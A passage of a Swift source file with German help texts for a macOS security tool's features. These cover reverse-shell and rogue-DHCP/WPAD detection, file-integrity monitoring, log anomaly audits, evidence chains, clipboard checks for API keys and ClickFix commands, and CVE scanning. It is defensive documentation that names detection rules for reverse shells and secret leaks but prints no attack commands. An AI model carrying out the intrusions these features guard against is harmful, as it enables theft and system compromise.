                • Erlaubnisliste: Für ein bekanntes Programm fügen Sie es über „Letzte Reverse-Shell-Erkennung zur Erlaubnisliste hinzufügen…“ als „Name@Ziel“ hinzu.
                • Die Regel `exec.reverse_shell_argv` des Prozessausführungs-Rekorders (feat_exec_recorder) erkennt die in einer Befehlszeile ausgeschriebene Form beim Start. Diese Funktion erkennt den tatsächlichen Zustand nach dem Verbindungsaufbau.
                • Wird automatisch deaktiviert, wenn die Pro-Lizenz verloren geht.
                """,
                recommendation: "Prüfen Sie bei einer Meldung den Programmpfad und den übergeordneten Prozess. Wenn Sie ihn nicht kennen, beenden Sie den Prozess und trennen Sie das Netzwerk, bevor Sie nachforschen."
            ),
            LocalizedEntry(
                id: "feat_network_settings_watch",
                title: "Überwachung von Netzwerkeinstellungen (falsches DHCP & WPAD, Pro)",
                summary: "Vergleicht die vom verbundenen Netzwerk verteilten DNS-Server, den Router und die automatische Proxy-Konfiguration (PAC) mit dem früheren Stand desselben Netzwerks und meldet Abweichungen. Das ist ein Hinweis auf einen gefälschten DHCP-Server oder einen WPAD-Man-in-the-Middle-Angriff. Nur Pro, standardmäßig an.",
                details: """
                • Öffnen: über den Menüleisteneintrag „🌐/✅ Änderungen der Netzwerkeinstellungen überwachen (Pro)“ umschalten.
                • Funktionsweise: Es empfängt Änderungen aus dem Systemkonfigurationsspeicher von macOS (SCDynamicStore), wartet einige Sekunden und liest dann DNS und Router der kabelgebundenen und der WLAN-Schnittstellen (en). Es werden weder externe Befehle noch Netzwerkverkehr verwendet.
                • Wovon es abweicht: Ein Netzwerk wird am WLAN-Namen (SSID) erkannt, bei unlesbarem Namen und im Kabelnetz an der Hardware-Adresse des Routers. Ein zum ersten Mal gesehenes Netzwerk wird nur gelernt, ohne Meldung.
                • Gemeldete Änderungen: (1) ein DNS-Server, der in diesem Netzwerk noch nie gesehen wurde (ausgenommen die Adresse des Routers selbst, bekannte öffentliche Resolver und das sichere DNS von RoamSwitch). (2) ein nie gesehener Router und ein nie gesehener DNS-Server gleichzeitig; so sieht es bei einem gefälschten DHCP-Server aus, und die Meldung ist deutlicher. (3) eine automatische Proxy-Konfiguration (PAC) von einem nie gesehenen Host. (4) „Automatische Proxy-Erkennung“ (WPAD) neu eingeschaltet. Ist der Router selbst neu und gibt zugleich seine eigene Adresse als DNS-Server aus, gilt das als deutliche Meldung (neuer Router plus neuer DNS-Server); die Adresse des Routers wird nur ausgenommen, wenn der Router bereits bekannt ist.
                • Was ignoriert wird: Ein Router, der sich allein ändert, wird nur gemerkt (ein Austausch ist häufig, und Gateway-Änderungen decken Netzwerkverlauf und ARP-Überwachung ab). VPNs, Tailscale und andere Tunnel (utun usw.) werden nicht gelesen. In den Diensteinstellungen gespeichertes DNS (von Ihnen, einem Konfigurationsprofil oder dem sicheren DNS von RoamSwitch) stammt nicht vom Netzwerk und wird nicht mit dem Verlauf des Netzwerks verglichen (der nächste Punkt behandelt es). Ein DNS-over-HTTPS-Profil erscheint hier nicht. In einem Netzwerk, das drei oder mehr Router gezeigt hat (Campus oder Büro mit je einem Subnetz pro Standort), gilt ein neuer Router als normal.
                • Gespeichertes DNS: Ein DNS-Server, der in den gespeicherten Einstellungen eines LAN- oder WLAN-Dienstes neu ist (geschrieben mit `networksetup -setdnsservers` oder im Bereich „Netzwerk“ der Systemeinstellungen), wird einmal als schwacher Hinweis gemeldet. Die eigene Adresse des Routers, Loopback, bekannte öffentliche Resolver, das sichere DNS von RoamSwitch und alles, was der Dienst schon früher gespeichert hatte, sind ausgenommen. Wer die gespeicherte Einstellung geschrieben hat, lässt sich nicht feststellen; eine Änderung von Ihnen sieht genauso aus. Über das Menü übernehmen Sie sie als bekannt. Der erste Blick nach dem Start der Überwachung und ein erstmals gesehener Dienst werden nur gelernt. Dienste von Tunneln (utun usw.) werden nicht gelesen.
                • Akzeptieren: Dieselbe Meldung kommt nur einmal. Bei einer Änderung, deren Grund Sie kennen (z. B. Routertausch), wählen Sie im Menü „Basis der Netzwerkeinstellungen auf den aktuellen Stand setzen…“, um den jetzigen Zustand als den richtigen dieses Netzwerks zu speichern. Es akzeptiert nie von selbst.
                • Bezug zur Prüfung: Der Prüfpunkt „Automatische Proxy-Erkennung (WPAD / PAC)“ (proxy_autodiscovery) prüft, ob WPAD oder ein vom Netzwerk gelieferter PAC gerade gilt.
                • Nur Hinweis: Es ändert keine Einstellung und blockiert nichts.
                • Grenzen: Ein gefälschter DHCP-Server selbst ist nicht sichtbar; nur der Unterschied im Ergebnis ist ein Hinweis. Ein falscher Server, der dieselben DNS-Server und denselben Router wie zuvor verteilt, wird nicht gefunden. macOS hat kein LLMNR. Der NetBIOS-Namensdienst (netbiosd) ist auf macOS vorhanden, aber Manipulationen seiner Antworten werden nicht überwacht. mDNS (Bonjour) ist eine bestimmungsgemäße Funktion und wird nicht als Befund behandelt.
                • Wird automatisch deaktiviert, wenn die Pro-Lizenz verloren geht.
                """,
                recommendation: "Prüfen Sie bei einer Meldung den Netzwerknamen und die angezeigten DNS-Server oder den Router. Wenn Sie Router oder Provider gewechselt haben, akzeptieren Sie es; wenn Sie es nicht erklären können, nutzen Sie dieses Netzwerk nicht weiter."
            ),
        ]
    }

    // MARK: - Features: audit, monitoring & platform

    private static func featuresDeAudit() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "feat_critical_path_fim",
                title: "Überwachung wichtiger Systemdateien auf Manipulation (Critical Path FIM) (Pro)",
                summary: "Erfasst eine SHA-256-Basislinie kritischer Dateien wie sudoers, SSH-Konfiguration, PAM und hosts, die durch legitime System- oder App-Updates so gut wie nie verändert werden, und benachrichtigt bei jeder Änderung, Löschung oder neuen Datei.",
                details: """
                • Dateien: `/etc/sudoers`, alles unter `/etc/sudoers.d/`, alles unter `/etc/pam.d/`, `/etc/ssh/sshd_config`, alles unter `/etc/ssh/sshd_config.d/`, `/etc/hosts` sowie `~/.ssh/authorized_keys` von root. Diese sind nur für root lesbar, daher berechnet der privilegierte Helfer die Prüfsummen.
                • Zeitpunkt: FSEvents auf `/etc`, `/etc/pam.d` und `/etc/ssh` lösen eine nahezu sofortige erneute Prüfung aus, mit einer stündlichen Prüfung als Rückfallebene.
                • Basislinie: Wird beim ersten Scan erfasst. Eine erkannte Änderung oder die Löschung einer Datei, die keine Zusatzdatei ist (Drop-ins unter `/etc/sudoers.d/` und `/etc/ssh/sshd_config.d/` sowie `/etc/pam.d/sudo_local`), wird nie automatisch als neue Basislinie übernommen, sodass der Befund bestehen bleibt, bis ihn ein Mensch überprüft. Derselbe Zustand wird nicht erneut gemeldet, solange die App läuft; jede weitere Änderung löst erneut einen Alarm aus. Eine neue Datei wird einmal gemeldet und dann in die Basislinie aufgenommen. Eine gelöschte Zusatzdatei wird einmal gemeldet und dann aus der Basislinie entfernt. Wenn Sie Touch ID für sudo einschalten, entsteht `/etc/pam.d/sudo_local`; das erscheint einmalig als Meldung über eine neue Datei. Beim Ausschalten wird die Datei gelöscht, auch das wird einmalig gemeldet. Zum Übernehmen: Malware-Schutz → „Basis der kritischen Dateien auf den aktuellen Stand aktualisieren…“, das zuerst die Unterschiede auflistet.
                • Warnung bei blinder Stelle: Kann der Helfer dreimal in Folge nicht erreicht werden, erhalten Sie den Hinweis, dass die Manipulationserkennung nicht funktioniert.
                • Hinweis: Während der Link-Schutz im hosts-Notlösungsmodus läuft, schreibt RoamSwitch selbst möglicherweise seinen verwalteten Abschnitt von `/etc/hosts` neu. LaunchAgents / Daemons werden von feat_persistence_monitor_guard abgedeckt.
                • Standard: Wird bei erstmaliger Aktivierung von Pro automatisch eingeschaltet. Menü: Malware-Schutz → „Wichtige Systemdateien regelmäßig auf Manipulation überwachen (Pro)“.
                • SSH-Hinweis: Die Benachrichtigung fügt die SSH-Sitzungen desselben Zeitraums hinzu (ab 30 Minuten vor der Änderung): Quelle, Konto, Authentifizierungsmethode und ob die Sitzung noch offen ist. Das ist nur ein Hinweis aufgrund zeitlicher Überschneidung und zeigt nicht, ob diese Sitzung die Datei geändert hat (dieser Mac zeichnet nicht auf, welcher Prozess geschrieben hat). Wurde keine SSH-Anmeldung gefunden, steht das ebenfalls dort.
                """,
                recommendation: "Prüfen Sie bei einer Warnung, ob Sie die Änderung selbst vorgenommen haben (z. B. `sudo visudo` oder eine Konfigurationsänderung). Wenn nicht, prüfen Sie die Datei sofort und erwägen Sie einen Passwortwechsel."
            ),
            LocalizedEntry(
                id: "feat_security_log_audit",
                title: "Mac-Sicherheitsprotokoll-Audit (manuell, Vorlagen-Anomalie-Erkennung, Kopie für KI-Beratung)",
                summary: "Extrahiert aus dem einheitlichen Protokoll von macOS sudo-Fehlversuche, SSH-Verbindungen, Gatekeeper-Blockierungen, XProtect-Erkennungen und Authentifizierungsereignisse und listet zusätzlich neue Protokollmuster und Häufigkeitsspitzen (Vorlagen-Anomalien) auf. In der kostenlosen Version enthalten.",
                details: """
                • Öffnen: Mac-Sicherheitsprüfung → „📜 Mac-Sicherheitsprotokoll-Audit…“ oder das MCP-Tool `audit_security_logs`.
                • Zeitraum: Letzte 24 Stunden, 3 Tage oder 7 Tage.
                • Übersichtskarten: Sudo-Fehlversuche, SSH-Verbindungen, Gatekeeper-Blockierungen, XProtect-Erkennungen, Vorlagen-Anomalien. Filterbar nach Kategorie und durchsuchbar.
                • Vorlagen-Anomalien: Protokollzeilen werden zu Vorlagen zusammengefasst, indem variable Teile (IP-Adressen, Hex-Adressen, Zahlen) maskiert werden. Angezeigt werden Muster, die auf diesem Mac noch nie aufgetreten sind ([neu]), sowie Spitzen weit über der üblichen Häufigkeit ([Spitze z=…], z-Wert 3 oder höher). Die Häufigkeit jedes Musters wird nach 3 Beobachtungen gelernt; danach wird bei normalem Aufkommen nicht mehr gewarnt.
                • Verständliche Einschätzung: Ein regelbasierter Assistent auf dem Gerät fasst das Ergebnis für Laien zusammen und nennt konkrete Prüfpunkte (keine externe API).
                • Ausgabe: „Bericht kopieren“, „Material für KI-Beratung kopieren“ (kopiert eine Frage plus Protokolle zum Einfügen in Claude, ChatGPT o. Ä.; RoamSwitch sendet dabei nichts) sowie „CSV exportieren (Pro)“.
                """,
                recommendation: "Führen Sie dieses Audit aus, wenn verdächtige Benachrichtigungen anhalten oder sich der Mac ungewöhnlich verhält, und prüfen Sie auf XProtect-Erkennungen oder einen Anstieg von sudo-Fehlversuchen."
            ),
            LocalizedEntry(
                id: "feat_scheduled_log_audit",
                title: "Automatische Protokollprüfung (lernt neue Muster & Häufigkeitsanomalien nach Zeitplan) (Pro)",
                summary: "Führt die Vorlagen-Anomalie-Erkennung des Protokoll-Audits stündlich im Hintergrund aus und lernt so kontinuierlich das normale Protokollverhalten dieses Mac. Findet sie neue Muster oder Häufigkeitsspitzen, benachrichtigt sie mit echten Protokollzeilen und einer verständlichen Erklärung.",
                details: """
                • Zeitplan: Stündlich, analysiert die letzte Stunde. Der erste Lauf erfolgt etwa 10 Sekunden nach der Aktivierung; da er die eigenen Startprotokolle der App enthält, lernt dieser Lauf nur, ohne zu benachrichtigen.
                • Benachrichtigung: Anzahl der Anomalien (aufgeteilt in neue Muster und Spitzen), bis zu 3 echte Protokollzeilen, ein Hinweis zum Lernfortschritt sowie eine Erklärung für Laien. Enthält eine Charge eine Häufigkeitsspitze, erscheint eine Meldung im Mitteilungszentrum; besteht sie nur aus neuen Mustern, wird sie ohne Pop-up nur im Benachrichtigungsverlauf festgehalten. Ein neues Muster gilt nach der Erfassung als „bekannt“ und wird für denselben Inhalt nie erneut erfasst; eine Spitze wird nicht mehr gemeldet, sobald die eigene Basislinie dieses Musters gelernt wurde.
                • Geteilt mit manuellem Audit: Nutzt dieselbe Analyse und gelernte Basislinie wie das manuelle Mac-Sicherheitsprotokoll-Audit und das MCP-Tool `audit_security_logs`.
                • Standard: Wird bei erstmaliger Aktivierung von Pro automatisch eingeschaltet. Menü: Malware-Schutz → „Automatische Protokollprüfung (lernt neue Muster & Häufigkeitsanomalien nach Zeitplan) (Pro)“.
                """,
                recommendation: "Erwarten Sie direkt nach der Einrichtung etwas mehr Meldungen zu neuen Mustern; sie klingen ab, sobald der Lernprozess fortschreitet. Erwähnt eine Meldung eine unbekannte App oder IP-Adresse, öffnen Sie das Protokoll-Audit-Fenster für Details."
            ),
            LocalizedEntry(
                id: "feat_containment_incident_timeline",
                title: "Eindämmungs-Vorfall-Zeitleiste (einheitliche Aufzeichnung, MITRE-ATT&CK-Zuordnung)",
                summary: "Speichert die vier automatischen Reaktionen (ARP-Spoofing, Ransomware-Köderdateien, XProtect-gebundene Trennung, automatische Blockierung unbekannter Ports) in einer chronologischen Aufzeichnung auf dem Gerät, damit Sie später nachvollziehen können, was passiert ist, was unternommen wurde und wann es behoben war.",
                details: """
                • Aufgezeichnet: Zeit, Quelle, Schweregrad, Zusammenfassung, Prozessname und PID (falls bekannt), ergriffene Maßnahme sowie Zeitpunkt und Grund der Behebung (manuell aufgehoben, nach Timeout automatisch aufgehoben oder auf die Positivliste gesetzt).
                • MITRE ATT&CK: Eine Technik-ID wird nur angehängt, wenn die Zuordnung sicher ist (ARP-Spoofing = T1557; Köderdatei gelöscht oder umbenannt = T1485; Verschlüsselung = T1486; sonstige Manipulation = T1565). Nichts wird geraten.
                • Speicherung: `~/Library/Application Support/RoamSwitch/containment_incident_timeline.json` (die neuesten 200). Wird nirgendwohin gesendet.
                • Das MCP-Tool `get_incident_timeline` liefert diese einheitliche Zeitleiste (nützlich zur Triage mit einer lokalen KI während eines Air-Gap). Verlaufsdaten je Schutzfunktion sind auch über `get_canary_status`, `get_port_anomaly_incidents` und `get_runtime_threat_status` verfügbar.
                • Wird ein Beweispaket gespeichert, kommt das Speichern als Eintrag unter dem Erkennungseintrag hinzu, und der Erkennungseintrag erhält den Paketnamen und den SHA-256 des Manifests. Verknüpft wird nur, wenn die ID des auslösenden Eintrags bekannt ist, nie allein wegen zeitlicher Nähe. `get_incident_timeline` fügt parentEventID, rootEventID und evidenceRefs nur dort hinzu, wo sie vorhanden sind.
                • Kann die Aufzeichnungsdatei nicht gelesen werden (beschädigt oder keine Berechtigung), wird das als unlesbar gemeldet statt als leere Liste (Fenster des Aktivitätsprotokolls; recordFile ist unreadable in `get_incident_timeline`). Eine beschädigte Datei wird vor dem nächsten Eintrag als .bak beiseitegelegt (weder überschrieben noch gelöscht).
                """,
                recommendation: "Prüfen Sie nach einer automatischen Trennung diese Zeitleiste zusammen mit dem Benachrichtigungsverlauf, um die Ursache zu finden und eine Wiederholung zu verhindern."
            ),
            LocalizedEntry(
                id: "feat_forensic_evidence_bundles",
                title: "Vorfall-Beweispakete und Manipulationserkennung",
                summary: "Beweispakete, die beim Eindämmen von Ransomware oder einer Laufzeitbedrohung automatisch gespeichert werden, werden später anhand eines außerhalb der Pakete geführten Kettenprotokolls darauf geprüft, ob sie verändert wurden. Das ist Manipulationserkennung, kein Manipulationsschutz.",
                details: """
                • Speichern: Beim Eindämmen von Ransomware oder einer Laufzeitbedrohung werden die Prozessliste, die Netzwerkverbindungen, kürzlich geänderte Dateien in den überwachten Ordnern und (falls erkannt) die offenen Dateien des verdächtigen Prozesses als Paket unter `~/Library/Application Support/RoamSwitch/incident-evidence/` gespeichert. manifest.json enthält die SHA-256 jeder Datei. Ein Paketmitschnitt und Prozessspeicher sind nicht enthalten.
                • Verknüpfung: manifest.json enthält die ID des Erkennungseintrags, der die Sicherung ausgelöst hat (nur wenn bekannt). In der Vorfall-Zeitleiste verweist der Erkennungseintrag mit dem Namen auf dieses Paket.
                • Kette: Die SHA-256 des Manifests des Pakets wird zeilenweise, zusammen mit dem Hash der vorherigen Zeile, in `chain.log` außerhalb des Pakets geschrieben (im selben incident-evidence-Ordner, 0600). Ein Schreibvorgang gilt erst als abgeschlossen, nachdem er auf die Platte geschrieben wurde (F_FULLFSYNC).
                • Prüfen: Das schreibgeschützte MCP-Tool `get_forensic_evidence_bundles` liefert für jedes Paket einen `integrity`-Wert: `verified`, `manifest_altered`, `artifact_altered:<Name>`, `artifact_missing:<Name>` oder `not_anchored` (ein Paket aus der Zeit vor der Kette, oder dessen Zeile entfernt wurde). Außerdem kommen `chainOk` und `chainBrokenAt` für die ganze Kette und `missingBundles` für Pakete, die die Kette nennt und die fehlen.
                • An eine beschädigte Kette wird keine Zeile angehängt, damit nicht verborgen wird, wo sie gerissen ist.
                • Grenze: Das ist Manipulations-Erkennung, kein Manipulationsschutz. Wer Ordner und Log gleichzeitig umschreiben kann, kann einen stimmigen Verlauf erzeugen.
                """,
                recommendation: "Bevor Sie sich auf ein Paket verlassen, dessen `integrity` nicht `verified` ist, prüfen Sie, ob der Ordner verändert wurde. `not_anchored` erscheint auch bei Paketen aus der Zeit vor der Kette."
            ),
            LocalizedEntry(
                id: "feat_security_activity_log",
                title: "Sicherheitsaktivitätsprotokoll (Suche, Filter und ein Zeitverlaufsdiagramm über alle Vorfälle)",
                summary: "Vereint die Eindämmungs-Vorfall-Zeitleiste und bestätigte Malware-Erkennungen in E-Mail-Anhängen in einem Bildschirm, den Sie nach Stichwort durchsuchen, nach Kategorie/Schweregrad filtern und über ein Zeitverlaufsdiagramm untersuchen können.",
                details: """
                • Öffnen: Menü „Umfassende Mac-Sicherheitsdiagnose" → „📈 Sicherheitsaktivitätsprotokoll…".
                • Datenquellen: die Eindämmungs-Vorfall-Zeitleiste (feat_containment_incident_timeline, die neuesten 200) vereint mit bestätigten Malware-Erkennungen aus dem Webmail-Download-Schutz (feat_webmail_download_guard).
                • Filter: Kategorie (ARP-Spoofing, Ransomware-Köderdatei, XProtect-gebundener Air-Gap, Port-Anomalie, ClickFix, Ausführungsprotokollierung, Ransomware-Entropie-Erkennung, Honeytoken, Browser-Zugangsdaten-Überwachung, Reverse-Shell-Erkennung, Überwachung der Netzwerkeinstellungen, gefährlicher Download), Schweregrad (alle/info/warning/critical), Zeitraum (letzte 24 Stunden / letzte 3 Tage / letzte 7 Tage / gesamter Zeitraum) und Freitextsuche (Groß-/Kleinschreibung ignorierende Teilstring-Suche in Zusammenfassung, Detail und Kategoriename).
                • Zeitverlaufsdiagramm: Balkendiagramm der Erkennungsanzahl im gewählten Zeitraum — stündliche Balken bei einem Fenster von 72 Stunden oder weniger, sonst tägliche, automatisch umgeschaltet. Klicken Sie auf einen Balken, um die Liste auf dieses Zeitfenster einzugrenzen; erneutes Klicken hebt die Eingrenzung auf.
                • Anzeigelimit: zeigt bis zu den neuesten 500 Einträgen (eine Meldung weist auf weitere hin und schlägt vor, die Filter einzugrenzen).
                • Export: CSV-Export (Pro). Bei CSV-Exporten (Benachrichtigungsverlauf, Log-Audit, Aktivitätsprotokoll, CVE-Scans und Ähnliches) wird einer Zelle, die mit =, +, -, @, einem Tabulator oder einem Wagenrücklauf beginnt, ein ' vorangestellt, damit eine Tabellenkalkulation sie nicht als Formel ausführt (auch ein npm-Paket @scope/pkg erhält das ').
                • Unterschied zu ähnlichen Bildschirmen: „Sicherheitsprotokoll-Audit" deckt eine andere Datenquelle ab, macOS' eigenes Unified Logging (sudo, SSH, Gatekeeper, XProtect). „Benachrichtigungsverlauf" ist die 7-Tage-Aufzeichnung jeder von RoamSwitch gesendeten Benachrichtigung. Dieser Bildschirm ist der einzige Ort, um ausschließlich in RoamSwitchs eigenen Eindämmungsentscheidungen zu suchen.
                """,
                recommendation: "Nutzen Sie es, um nach einer automatischen Trennung zu überprüfen, was passiert ist, oder um Erkennungstrends nach Kategorie und Zeitraum zu vergleichen."
            ),
            LocalizedEntry(
                id: "feat_notification_history",
                title: "Benachrichtigungsverlauf (letzte Woche)",
                summary: "Speichert jede von RoamSwitch gesendete Benachrichtigung 7 Tage lang, damit Sie verpasste Warnungen nachträglich prüfen können. Auch Ereignisse, die ohne Banner nur im Verlauf vermerkt werden, wie eine EICAR-Testsignatur-Erkennung, erscheinen hier. In der kostenlosen Version enthalten.",
                details: """
                • Öffnen: Mac-Sicherheitsprüfung → „🔔 Benachrichtigungsverlauf…“.
                • Aufbewahrung: 7 Tage; ältere Einträge werden automatisch entfernt, sobald ein neuer aufgezeichnet wird.
                • Inhalt: Zeit, Titel und Text, einschließlich Bedrohungsalarme, Link-Schutz-Verbindungsereignisse, ClickFix- und Geheimnis-Schlüssel-Erkennungen sowie automatische Trennungen.
                • EICAR-Testsignatur: Die harmlose branchenübliche Testdatei ist keine echte Bedrohung und wird daher weder isoliert noch blockiert; es erscheint kein Banner, sie wird nur hier vermerkt. Dies gilt gleichermaßen für Download-Schutz, Schnellscans und geplante Scans.
                • Ein KI-Assistent kann diesen Verlauf über das MCP-Tool `get_notification_history` lesen.
                """,
                recommendation: "Haben Sie unterwegs oder beschäftigt eine Benachrichtigung verpasst, prüfen Sie sie hier."
            ),
            LocalizedEntry(
                id: "feat_secret_leak_auditor",
                title: "Zwischenablage-Schutz (Warnung vor API-Key-Einfügen & Entfernen von ClickFix-Befehlen)",
                summary: "Überwacht die Zwischenablage ausschließlich auf dem Gerät, warnt beim Kopieren eines API-Schlüssels oder privaten Schlüssels, damit Sie ihn nicht versehentlich einfügen, und leert die Zwischenablage automatisch, wenn Sie einen bösartigen Befehl kopieren, den eine Betrugsseite ausführen lassen will (ClickFix). In der kostenlosen Version standardmäßig aktiviert.",
                details: """
                • Überwachung: Prüft die Zwischenablage etwa einmal pro Sekunde auf Änderungen. Inhalte werden nie gesendet oder gespeichert.
                • Erkannte Schlüssel: API-Schlüssel und Tokens von OpenAI, Anthropic, GitHub, AWS, Hugging Face, Google AI / Gemini, Slack und Stripe sowie private RSA-/SSH-Schlüssel. Außerdem Krypto-Wallet-Seed-Phrasen (BIP39) und Bitcoin-Private-Keys (WIF/BIP32) — beide werden per Prüfsumme verifiziert, um Fehlalarme gering zu halten.
                • Bei Geheimschlüsseln: Nur eine Benachrichtigung („Vertraulicher Schlüssel in Zwischenablage erkannt“); die Zwischenablage wird nicht geleert, da ein durchgesickerter Schlüssel im Nachhinein noch widerrufen und erneuert werden kann.
                • Bei ClickFix-Befehlen: Eine Benachrichtigung („Verdächtiger Befehl in Zwischenablage erkannt“), und die Zwischenablage wird sofort geleert, sodass das Einfügen gestoppt wird, egal wohin es gehen sollte: Terminal, Skripteditor, Spotlight oder anderswo. Dies ergänzt feat_clickfix_guard, das den Shell-Verlauf überwacht.
                """,
                recommendation: "Achten Sie nach dem Kopieren eines API-Schlüssels darauf, wo Sie ihn einfügen, insbesondere in KI-Chats und Webformularen. Haben Sie ihn versehentlich geteilt, widerrufen und erneuern Sie ihn sofort."
            ),
            LocalizedEntry(
                id: "feat_secret_leak_audit_tool",
                title: "Manuelle Geheimnis-/API-Key-Leck-Prüfung (Text einfügen oder ganzen Ordner scannen)",
                summary: "Ein Prüfwerkzeug auf Abruf, das eingefügten Text sofort prüft oder einen Ordner rekursiv scannt und dabei Zeilennummern, maskierte Werte und Widerrufsschritte für jeden Schlüsseltyp anzeigt. In der kostenlosen Version enthalten.",
                details: """
                • Öffnen: Malware-Schutz → „🔑 Geheimnis-/API-Key-Lecks manuell prüfen…“ oder das MCP-Tool `audit_secrets` (mit `text` oder `path`).
                • Methode: Reguläre Ausdrücke plus Shannon-Entropie-Bewertung. Erkannte Werte werden maskiert angezeigt.
                • Ordnerscan: `.git`, `node_modules`, `target`, `vendor`, `dist`, `build`, `__pycache__` und `venv` werden automatisch übersprungen, ebenso Dateien über 2 MB und Binärdateien.
                • Berechtigungshinweis: Beim Auswählen eines geschützten Ordners wie Schreibtisch oder Downloads erscheint vor der macOS-Abfrage zunächst eine einmalige Erklärung, warum der Zugriff nötig ist und dass der Scan Zero Telemetry ist.
                • `audit_secrets` hat für einen Verzeichnispfad das optionale boolesche Argument `include_build_output`. Der rekursive Ordnerscan liest dist und build nicht, damit erzeugter Code nicht doppelt gemeldet wird; die Dateien, die eine Website veröffentlicht, blieben dadurch ungeprüft. Mit `include_build_output` auf true werden zusätzlich die Ordner dist, build, out, .next/static, .output/public, .svelte-kit/output, public und static des Projekts gelesen (oder der Ordner selbst, wenn keiner davon existiert) und nach eingebetteten API-Keys, privaten Schlüsseln und Krypto-Schlüsseln, JWTs und Source Maps (.map-Dateien) gesucht, die nicht in die Produktion gehören; das Ergebnis erhält `buildOutput`. Ein gefundener Wert wird nur mit den ersten 4 Zeichen und seiner Länge angezeigt. Die Grenzen: 5 MB pro Datei, 200 MB insgesamt und 20.000 Dateien. Ein symbolischer Link wird nur verfolgt, wenn er im Ordner bleibt.
                • Läuft in einem Hintergrund-Thread, ohne die Oberfläche einzufrieren. Es wird nichts gesendet.
                """,
                recommendation: "Nutzen Sie dieses Werkzeug, bevor Sie ein Repository veröffentlichen oder Code in einen KI-Chat einfügen."
            ),
            LocalizedEntry(
                id: "feat_package_cve_scan",
                title: "Paket-CVE-Abgleich (Homebrew + 7 Ökosysteme, u. a. npm / PyPI / crates.io, Zero Telemetry)",
                summary: "Gleicht installierte Homebrew-Pakete sowie die Abhängigkeits-Lock-Dateien in von Ihnen gewählten Projektordnern mit auf dem Gerät gehaltenen bekannten CVE-Karten ab. Der Scan selbst stellt keine Netzwerkanfragen. In der kostenlosen Version enthalten.",
                details: """
                • Öffnen: Malware-Schutz → „📦 Paket-CVE-Abgleich (Homebrew)…“. Für Abhängigkeiten fügen Sie Projektordner im Tab „Abhängigkeiten“ hinzu.
                • Homebrew: `brew list --versions` wird mit einer aus echten NVD-Daten erzeugten Formula-zu-CPE-Tabelle abgeglichen. Funde tragen eine Vertrauensstufe: confirmed (verifizierte Tabelle) oder gray (unverifizierter Schlüsselwort-Treffer, möglicherweise ein Fehlalarm).
                • Abhängigkeiten: Analysiert package-lock.json / requirements.txt / Pipfile.lock / poetry.lock / Cargo.lock / Gemfile.lock / composer.lock / go.sum / pom.xml und gleicht sie mit bekannten CVE-Karten für npm, PyPI, crates.io, RubyGems, Packagist, Go und Maven ab (aus OSV.dev, CVSS 7.0 oder höher).
                • Datenzustellung: Die CVE-Karten werden etwa einmal pro Woche aus einem signierten Manifest rein empfangend abgerufen. Vor dem Abruf werden sie als noch nicht heruntergeladen angezeigt und erkennen nichts.
                • MCP-Tools: `run_package_cve_scan` (Homebrew) und `run_package_cve_scan_languages` (Abhängigkeiten, Argument `watchedFolders`).
                • Wenn nichts geprüft wurde: Ohne Homebrew, bei fehlschlagendem brew oder ohne Pakete zeigt das Fenster ein graues „nichts geprüft“ statt des grünen „nichts gefunden“ (homebrewInventory von `run_package_cve_scan` ist brew_missing oder brew_failed). Schlägt die Aktualisierung der CVE-Daten fehl, zeigen Fenster und Menü, wann zuletzt aktualisiert wurde und warum es scheiterte; das steht auch in feedUpdates von `get_guard_status`.
                • Wenn die Aktualisierungen stehen bleiben: Hat der Updater einen genutzten Datenbestand eine Woche lang nicht geprüft (zwei Wochen bei den beiden CVE-Karten, die nur wöchentlich geholt werden; eine fehlgeschlagene Prüfung zählt als Prüfung), zeigt das Menü eine Warnzeile mit dem Namen des Bestands und dem Zeitpunkt der letzten Prüfung. In `get_guard_status` steht der Guard signedUpdates auf off mit dem Grund state_stale, und der Bestand hat in feedUpdates stale: true. Gemeint sind die Paket-CVE-Karte und die Web-Regeln, die Link-Liste, solange die automatischen Updates des Linkschutzes an sind (Pro), und die CVE-Karte des aktiven Scans, solange der aktive Scan an ist. Ein Neustart von RoamSwitch prüft sofort. Ein Bestand, der nie geprüft wurde, gilt nicht als stehen geblieben; die Fenster zeigen, dass er noch nicht aktualisiert wurde.
                """,
                recommendation: "Führen Sie den Homebrew-Scan regelmäßig aus, registrieren Sie aktive Projekte im Tab „Abhängigkeiten“ und aktualisieren Sie Pakete mit schwerwiegenden CVEs umgehend."
            ),
            LocalizedEntry(
                id: "feat_lockfile_tamper_guard",
                title: "Überwachung auf Manipulation von Abhängigkeits-Lockfiles (Lockfile FIM, Pro)",
                summary: "Überwacht package-lock.json / yarn.lock / pnpm-lock.yaml / npm-shrinkwrap.json fortlaufend über eine SHA-256-Baseline und erkennt externe Manipulation über CI oder die Lieferkette. Nur Pro.",
                details: """
                • Öffnen: über den Menüleisteneintrag „🔔/✅ Überwachung auf Manipulation von Abhängigkeits-Lockfiles (Pro)“ umschalten.
                • Überwachte Dateien: dieselben Projektordner, die im Tab „Abhängigkeiten“ des Paket-CVE-Abgleichs registriert sind — keine separate Ordnerliste.
                • Erkennung: SHA-256-Baseline-Diff via CryptoKit, mit FSEvents-Nahzeiterkennung plus stündlichem Backstop-Scan.
                • Dringlichkeit: Läuft npm/yarn/pnpm selbst zum Erkennungszeitpunkt, wird dies im Mitteilungsverlauf vermerkt und nur leise benachrichtigt; andernfalls erfolgt eine normale kritische Benachrichtigung. Die Erkennung selbst wird in beiden Fällen durchgeführt.
                • Wird bei Verlust der Pro-Lizenz automatisch deaktiviert.
                • Änderungen akzeptieren: Die Basis wird nie automatisch fortgeschrieben. Bei einer eigenen Änderung (z. B. npm install) wählen Sie in der Menüleiste „Lockfile-Basis auf aktuellen Zustand aktualisieren…“, damit der aktuelle Zustand zur Basis wird. Bereits gemeldete Änderungen werden gespeichert, sodass dieselbe Meldung nach einem Neustart der App nicht wiederholt wird.
                • Ist kein überwachter Ordner registriert, wird nichts überwacht. Der Menüeintrag zeigt „Keine Ordner zur Überwachung“, und der Schutz ist in `get_guard_status` off (Grund no_folders_registered). Registrieren Sie Ihre Projektordner unter „Paket-CVE-Abgleich“.
                """,
                recommendation: "Registrieren Sie wichtige Projekte im Tab „Abhängigkeiten“ des Paket-CVE-Abgleichs und lassen Sie dies aktiviert (Standard bei aktivem Pro)."
            ),
            LocalizedEntry(
                id: "feat_package_lifecycle_script_scan",
                title: "Übersicht der Installationsskripte (npm package.json Lifecycle-Skripte, Pro)",
